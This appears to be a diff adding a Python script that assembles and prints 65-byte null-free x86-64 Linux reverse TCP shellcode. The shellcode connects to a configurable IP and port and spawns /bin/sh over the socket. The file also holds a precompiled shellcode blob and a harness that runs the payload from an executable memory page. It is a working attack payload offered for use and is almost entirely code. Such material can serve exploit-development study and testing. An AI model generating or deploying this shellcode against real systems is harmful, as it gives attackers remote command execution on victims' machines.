@@ -1,0 +1,171 @@
+#!/usr/bin/env python3
+
+import ctypes, struct, binascii, os, socket
+from keystone import *
+
+#####################################################
+#                                                   #
+#   Dynamic null-free reverse TCP shell(65 bytes)   *
+#           Written by Philippe Dugre               #
+#                                                   #
+#####################################################
+
+#shellcode = 	b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e"
+#shellcode += 	b"\x0f\x05\x97\xb0\x2a\x48\xb9\xfe\xff\xee"
+#shellcode += 	b"\xa3\x80\xff\xff\xfe\x48\xf7\xd9\x51\x54"
+#shellcode += 	b"\x5e\xb2\x10\x0f\x05\x6a\x03\x5e\xb0\x21"
+#shellcode += 	b"\xff\xce\x0f\x05\x75\xf8\x99\xb0\x3b\x52"
+#shellcode += 	b"\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
+#shellcode += 	b"\x51\x54\x5f\x0f\x05"
+
+# This script requires keystone to generate the shellcode,
+# but it can easily be compiled with nasm with a few modifications.
+
+# Generates struct from IP and port
+def sockaddr():
+
+    # Change this
+    IP = "127.0.0.1"
+    PORT = 4444
+
+    family = struct.pack('H', socket.AF_INET)
+    portbytes = struct.pack('H', socket.htons(PORT))
+    ipbytes = socket.inet_aton(IP)
+    number = struct.unpack('Q', family + portbytes + ipbytes)
+    number = -number[0]        #negate
+    return "0x" + binascii.hexlify(struct.pack('>q', number)).decode('utf-8')
+
+
+# Function to format shellcode to a printable output. Currently python3 formatting.
+# Modify according to the language you use.
+def format_shellcode(shellcode):
+    LINE_LENGTH=40
+    raw = binascii.hexlify(shellcode)
+    escaped = (b"\\x" + b"\\x".join(raw[i:i+2] for i in range (0, len(raw), 2))).decode('utf-8')
+    lines = [escaped[i: i+LINE_LENGTH] for i in range(0, len(escaped), LINE_LENGTH)]
+    return "shellcode = \tb\"" + "\"\nshellcode += \tb\"".join(lines) + "\""
+
+
+def main():
+    # Note: null-byte depends on the address and port.
+    # Special modifications might be needed for some address.
+    address = sockaddr()
+
+    # Shellcode is here
+    assembly = (
+        "socket:                             "
+        "   push byte 41                    ;"      # Push/pop will set syscall num
+        "   pop rax                         ;"
+        "   cdq                             ;"      # cdq sets rdx to 0 if rax is positive
+        "   push byte 2                     ;"      # AF_INET = 2
+        "   pop rdi                         ;"
+        "   push byte 1                     ;"      # SOCK_STREAM = 1
+        "   pop rsi                         ;"
+        "   syscall                         ;"      # socket(AF_INET, SOCK_STREAM, 0)
+        "connect:                           ;"
+        "   xchg eax, edi                   ;"      # rdi is 2, so moving only al is doable
+        "   mov al, 42                      ;"
+        "   mov rcx, " + address +         ";" +    # Socket address and port
+        "   neg rcx                         ;"
+        "   push rcx                        ;"
+        "   push rsp                        ;"      # mov rsi, rsp. This it the pointer to sockaddr
+        "   pop rsi                         ;"
+        "   mov dl, 16                      ;"      # sockaddr length
+        "   syscall                         ;"      # connect(s, addr, len(addr))
+        "dup2:                              ;"
+        "   push byte 3                     ;"      # Start with 3 and decrement
+        "   pop rsi                         ;"
+        "dup2_loop:                          "      # Duplicate socket fd into stdin,
+                                                    # stdout and stderr, which fd are 0, 1 and 2
+        "   mov al, 33                      ;"      # If there is no error, rax is 0 on connect and dup2
+        "   dec esi                         ;"
+        "   syscall                         ;"      # dup2(s, rsi)
+        "   jnz dup2_loop                   ;"      # Jump when esi == 0
+        "execve:                             "
+        "   cdq                             ;"
+        "   mov al, 59                      ;"      # execve syscall is 59
+        "   push rdx                        ;"      # Put null-byte in /bin//sh
+        "   mov rcx, 0x68732f2f6e69622f     ;"      # /bin//sh
+        "   push rcx                        ;"
+        "   push rsp                        ;"      # rsp points to the top of the stack, which is occupied by /bin/sh
+        "   pop rdi                         ;"      # We use a push/pop to prevent null-byte and get a shorter shellcode
+        "   syscall                         ;"      # execve('/bin//sh', 0, 0)
+    )
+
+    engine = Ks(KS_ARCH_X86, KS_MODE_64)
+    shellcode, count = engine.asm(assembly)
+    shellcode = bytearray(shellcode) # Needs to be mutable for later
+
+    print("Number of instructions: " + str(count))
+
+    # Print shellcode in a copy-pasteable format
+    print()
+    print("Shellcode length: %d" % len(shellcode))
+    print()
+    print(format_shellcode(shellcode))
+    print()
+
+    #####################################################################
+    #                   TESTING THE SHELLCODE                           #
+    #####################################################################
+
+    # The rest of the script is used to test the shellcode. Don't run this if you just need the shellcode
+
+
+    # Leave time to attach the debugger
+    print("If you want to debug, attach the debugger to the python process with pid %d then press enter." % os.getpid())
+    input()
+
+    # Load libraries
+    libc = ctypes.cdll.LoadLibrary("libc.so.6")
+    libpthread = ctypes.cdll.LoadLibrary("libpthread.so.0")
+
+    # Put the shellcode into a ctypes valid type.
+    shellcode = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+
+    # Both function returns 64bits pointers
+    libc.malloc.restype = ctypes.POINTER(ctypes.c_int64)
+    libc.mmap.restype = ctypes.POINTER(ctypes.c_int64)
+
+    # Get page size for mmap
+    page_size = libc.getpagesize()
+
+    # mmap acts like malloc, but can also set memory protection so we can create a Write/Execute shellcodefer
+    # void *mmap(void *addr, size_t len, int prot, int flags,
+    #   int fildes, off_t off);
+    ptr = libc.mmap(ctypes.c_int64(0),      # NULL
+            ctypes.c_int(page_size),        # Pagesize, needed for alignment
+            ctypes.c_int(0x07),             # Read/Write/Execute: PROT_READ | PROT_WRITE | PROT_EXEC
+            ctypes.c_int(0x21),             # MAP_ANONYMOUS | MAP_SHARED
+            ctypes.c_int(-1),               # No file descriptor
+            ctypes.c_int(0))                # No offset
+
+    # Copy shellcode to newly allocated page.
+    libc.memcpy(ptr,                        # Destination of our shellcode
+                shellcode,                        # Shellcode location in memory
+                ctypes.c_int(len(shellcode)))     # Nomber of bytes to copy
+
+    # Allocate space for pthread_t object.
+    # Note that pthread_t is 8 bytes long, so we'll treat it as an opaque int64 for simplicity
+    thread = libc.malloc(ctypes.c_int(8))
+
+    # Create pthread in the shellcodefer.
+    # int pthread_create(pthread_t *thread, const pthread_attr_t *attr,
+    #   void *(*start_routine) (void *), void *arg);
+    libpthread.pthread_create(thread,       # The pthread_t structure pointer where the thread id will be stored
+                            ctypes.c_int(0),# attributes = NULL
+                            ptr,            # Our shellcode, which is what we want to execute
+                            ctypes.c_int(0))# NULL, as we don't pass arguments
+
+    # Wait for the thread.
+    # int pthread_join(pthread_t thread, void **retval);
+    libpthread.pthread_join(thread.contents,# Here, we pass the actual thread object, not a pointer to it
+                        ctypes.c_int(0))# Null, as we don't expect a return value
+
+
+if(__name__ == "__main__"):
+    main()
+
+
+
+
